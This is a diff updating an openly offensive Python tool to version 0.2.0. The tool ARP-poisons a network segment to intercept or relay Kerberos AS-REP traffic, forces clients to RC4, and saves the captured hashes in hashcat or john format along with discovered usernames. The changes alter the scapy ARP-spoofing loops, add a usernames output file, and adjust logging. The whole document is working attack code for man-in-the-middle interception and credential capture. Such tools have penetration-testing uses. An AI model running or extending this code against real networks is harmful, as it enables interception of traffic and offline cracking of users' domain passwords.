@@ -34,7 +34,7 @@ def display_banner():
                             | |                                        
                             |_|                                     
 Author : Yassine OUKESSOU
-Version : 0.1.0
+Version : 0.2.0
                             """)
 
 def is_dc_up(dc, iface):
@@ -66,8 +66,8 @@ def get_mac_addresses(ip_list):
 
 def relaymode_arp_spoof(spoofed_ip):
     timer = 0
-    while not stop_arp_spoofing_flag.is_set() and Targets != set():
-        send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
+    while not stop_arp_spoofing_flag.is_set() :
+        if Targets != set() : send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
         time.sleep(1)
         timer += 1
         if timer == 3 :
@@ -75,8 +75,8 @@ def relaymode_arp_spoof(spoofed_ip):
             timer = 0
 
 def listenmode_arp_spoof():
-    while not stop_arp_spoofing_flag.is_set() and Targets != set():
-        send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
+    while not stop_arp_spoofing_flag.is_set() :
+        if Targets != set() : send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
         time.sleep(1)
 
 def valid_ip(address):
@@ -91,7 +91,8 @@ display_banner()
 parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Clients are forced to use RC4 if supported.\n"
                                                                                 "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
-parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack.')
+parser.add_argument('-outfile', action='store', help='Output file name to write hashes to crack.')
+parser.add_argument('-usersfile', action='store', help='Output file name to write discovered usernames.')
 parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
 parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity.')
 group = parser.add_argument_group('ARP poisoning')
@@ -144,6 +145,7 @@ if parameters.t is not None and parameters.tf is not None :
 
 mode = parameters.mode
 outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
+usersfile = parameters.usersfile if parameters.usersfile is not None else 'usernames.seen'
 HashFormat = parameters.format
 iface = parameters.iface if parameters.iface is not None else conf.iface
 disable_spoofing = parameters.disable_spoofing
@@ -197,7 +199,10 @@ if parameters.dc is not None and not is_dc_up(dc, iface):
 
 if parameters.dc is not None and ipaddress.ip_address(dc) in ipaddress.ip_network(subnet) :
     if parameters.gw is None :
-        logging.info('[*] DC seems to be in the same VLAN, will spoof as DC\'s IP')
+        if mode == 'relay' :
+            logging.info('[*] DC seems to be in the same VLAN, will spoof as DC\'s IP')
+        else :
+            logging.info('[*] DC seems to be in the same VLAN, will poison the DC\'s ARP cache')
         gw = dc
     elif parameters.gw != dc :
         logging.warning('[!] DC seems to be in the same VLAN, will ignore -gw parameter')
@@ -218,10 +223,18 @@ UsernamesCaptured = {}
 UsernamesSeen = set()
 
 try :
-    with open('Usernames.seen', 'r') as f :
+    with open(usersfile, 'r') as f :
         AllUsernames = set(f.read().strip().split('\n'))
 except :
     AllUsernames = set()
+
+
+if os.path.isfile(outfile) :
+    i = 1
+    while os.path.isfile(f'{outfile}.{i}') :
+        i += 1
+    outfile += f'.{i}'
+
 
 with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
     ip_forward = f.read().strip()
@@ -283,7 +296,7 @@ if not disable_spoofing :
     if parameters.mode == 'listen':
         thread = threading.Thread(target=listenmode_arp_spoof)
         thread.start()
-        logging.info('[+] ARP poisoning the gateway')
+        if dc != gw : logging.info('[+] ARP poisoning the gateway')
     elif parameters.mode == 'relay' :
         Targets.intersection_update(set(mac_addresses.keys()))
         if Targets == set() :
@@ -400,9 +413,12 @@ def listen_mode():
             logging.info('[*] Restored IPV4 forwarding value')
         AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
         if AllUsernames != set() :
-            with open('Usernames.seen', 'w') as f :
+            with open(usersfile, 'w') as f :
                 f.write('\n'.join(list(AllUsernames)) + '\n')
-            logging.info('[+] Listed seen usernames in file Usernames.seen')
+            logging.info(f'[+] Listed seen usernames in file {usersfile}')
+        if UsernamesCaptured != {} :
+            logging.info(f'[+] Listed hashes in file {outfile}')
+        
 
 
 
@@ -420,13 +436,16 @@ def update_uphosts():
     mac_addresses = get_mac_addresses(list(InitialTargets))
     new_hosts = set(mac_addresses.keys()) - Targets
     old_hosts = Targets - set(mac_addresses.keys())
-    if len(old_hosts) > 0 : logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
+    if len(old_hosts) > 0 : 
+        logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
     if not stop_spoofing : 
         Targets.update(new_hosts)
         if len(new_hosts) > 0 : logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
     Targets.difference_update(old_hosts)
     if len(new_hosts) > 0 or len(old_hosts) > 0 :
         logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
+        if Targets == set() : logging.warning(f'[!] No more target is up. Continuing probing targets...')
+
 
 
 
@@ -596,10 +615,11 @@ def relay_mode() :
             logging.info('[*] Restored IPV4 forwarding value')
         AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
         if AllUsernames != set() :
-            with open('Usernames.seen', 'w') as f :
+            with open(usersfile, 'w') as f :
                 f.write('\n'.join(list(AllUsernames)) + '\n')
-            logging.info('[+] Listed seen usernames in file Usernames.seen')
-
+            logging.info(f'[+] Listed seen usernames in file {usersfile}')
+        if UsernamesCaptured != {} :
+            logging.info(f'[+] Listed hashes in file {outfile}')
 
 
 
